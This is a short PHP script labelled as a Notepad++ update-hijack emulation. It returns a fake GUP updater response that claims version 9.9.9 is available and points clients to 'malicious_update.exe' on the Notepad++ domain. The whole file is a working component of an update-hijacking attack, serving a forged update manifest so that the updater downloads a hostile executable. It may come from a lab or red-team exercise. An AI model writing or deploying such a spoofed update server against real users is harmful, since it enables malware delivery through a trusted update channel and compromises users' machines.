<?php
/**
 * Notepad++ Update Hijack Emulation (HTTPS Enabled)
 */

header('Content-Type: text/xml; charset=utf-8');

// We use HTTPS now because the server supports it
echo '<?xml version="1.0" encoding="utf-8" ?>' . PHP_EOL;
echo '<GUP>' . PHP_EOL;
echo '    <NeedToBeUpdated>yes</NeedToBeUpdated>' . PHP_EOL;
echo '    <Version>9.9.9</Version>' . PHP_EOL;
echo '    <Location>https://notepad-plus-plus.org/malicious_update.exe</Location>' . PHP_EOL;
echo '</GUP>' . PHP_EOL;
?>
